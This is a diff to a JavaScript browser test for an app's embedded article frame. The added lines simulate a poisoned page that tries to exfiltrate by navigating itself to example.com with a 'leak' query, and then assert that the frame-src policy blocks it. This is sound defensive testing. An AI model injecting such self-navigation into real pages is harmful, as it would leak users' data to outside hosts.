@@ -49,6 +49,12 @@ try {
   check('the story link is an outside https link: ' + target, /^https:\/\//.test(target || ''));
   check('the app frame stayed on its own page (never navigated to the article)', after === before && /\/app-ui\//.test(after));
   check('the station opened the article outside: ' + JSON.stringify(opened), opened.length === 1 && opened[0] === new URL(target).href);
+  // the page tries to LEAVE (a poisoned page exfiltrating by navigating itself): the station page's frame-src refuses it
+  await inFrame(`(() => { setTimeout(() => { location.href = 'https://example.com/?leak=1'; }, 50); return true; })()`);
+  await sleep(2500);
+  const tree = await cdp.send('Page.getFrameTree');
+  const urls = (tree.frameTree.childFrames || []).map((c) => c.frame.url);
+  check('a page that navigates ITSELF to the web is blocked (no frame reached example.com): ' + JSON.stringify(urls.map(u => u.slice(0, 40))), !urls.some(u => /example.com/.test(u)));
   await capture(cdp, out, 'after-click');
 } catch (e) { console.error(String((e && e.stack) || e)); failed++; }
 finally {
